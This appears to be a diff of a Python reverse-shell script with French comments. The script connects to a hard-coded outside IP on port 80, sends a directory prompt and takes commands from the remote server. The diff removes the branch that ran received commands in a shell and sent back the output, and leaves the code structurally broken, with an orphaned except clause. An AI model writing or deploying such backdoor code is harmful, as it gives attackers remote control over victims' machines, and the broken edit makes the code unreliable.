@@ -2,13 +2,12 @@ import os
 import socket
 import subprocess
 
-
 def cmmds(cmds, isshell):
-    execcmd = subprocess.Popen(cmds, shell=isshell, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+    execcmd = subprocess.Popen(cmds, shell=isshell, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     return execcmd
 
-ip = "2.7.151.80"
-port = 80
+ip = "2.7.151.80"  # Adresse IP du serveur
+port = 80  # Port d'écoute du serveur
 
 cnnect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 cnnect.connect((ip, port))
@@ -17,7 +16,6 @@ while True:
     try:
         # Envoyer le répertoire courant
         current_dir = os.getcwd()
-        cnnect.sendall(b"[+] I am connected to you... to see in which direction\n")
         cnnect.send(f"{current_dir}> ".encode())
 
         command = cnnect.recv(2048).decode()
@@ -32,13 +30,10 @@ while True:
     if command.startswith("cd "):
         try:
             os.chdir(command[3:].strip())
+            cnnect.send(b"Directory changed\n")
         except Exception as e:
             cnnect.send(f"Error changing directory: {str(e)}\n".encode())
-    else:
-        try:
-            cmmd = cmmds(command, isshell=True)
-            output = cmmd.stdout.read() + cmmd.stderr.read()
-            cnnect.send(output)
+
+
         except Exception as a:
             cnnect.send(b"[!] ERROR")
-
